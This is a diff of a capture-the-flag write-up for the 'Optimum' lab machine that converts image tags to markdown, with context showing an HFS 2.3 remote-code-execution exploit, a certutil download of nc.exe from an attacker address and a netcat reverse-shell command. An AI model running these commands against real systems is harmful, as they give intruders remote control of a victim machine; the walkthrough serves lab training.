@@ -26,14 +26,14 @@ OS and Service detection performed. Please report any incorrect results at https
 \
 **Initial Shell Vulnerability Exploited:**\
 Since port 80 was open, I got into the main page and could see that it was powered by HttpFileServer (HFS) 2.3:\
-<img src="images/optimum/hfs_mainpage.png" alt="hfs_mainpage" width="600" height="400"/> </br>
+![hfs_mainpage](images/optimum/hfs_mainpage.png) </br>
 I found an exploit for this version on [Exploit-DB](https://www.exploit-db.com/exploits/49584) and modified the exploit to my IP Address and port, and it worked: </br>
-<img src="images/optimum/initial_shell_poc.png" alt="initial_shell_poc" width="1000" height="400"/> </br>\
+![initial_shell_poc](images/optimum/initial_shell_poc.png) </br>
 **Vulnerability Explanation:**  The findMacroMarker function in parserLib.pas in Rejetto HTTP File Server
 (aka HFS or HTTP Fileserver) 2.3x before 2.3c allows remote attackers to execute arbitrary programs via
 a %00 sequence in a search action, and the exploit abuses it </br>
 **Initial Shell Screenshot:** </br>
-<img src="images/optimum/initial_shell_poc2.png" alt="initial_shell_poc2" width="650" height="120"/> </br> </br>
+![initial_shell_poc2](images/optimum/initial_shell_poc2.png) </br> </br>
 <!--Privilege Escalation:-->
 # Privilege Escalation:
 I used [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester), and copied all of the system information with the Command: ```systeminfo```, saved it into a file on my Kali, and ran the script with the command:
@@ -54,7 +54,7 @@ I used certutil to transfer the file from my Kali to the Windows machine:
 certutil -urlcache -split -f "http://10.10.14.3/nc.exe" nc.exe
 ```
 Finally, I ran the netcat with: ```nc.exe 10.10.14.3 4444 -e cmd.exe``` </br> </br>
-<img src="images/optimum/netcat_shell.png" alt="netcat_shell" width="700" height="200"/> </br> </br>
+![netcat_shell](images/optimum/netcat_shell.png) </br> </br>
 Downloaded the MS16-098 Exploit from [Exploit-DB](https://www.exploit-db.com/exploits/41020), And transferred it to the Windows
 Machine with certutil: </br>
 ```bash
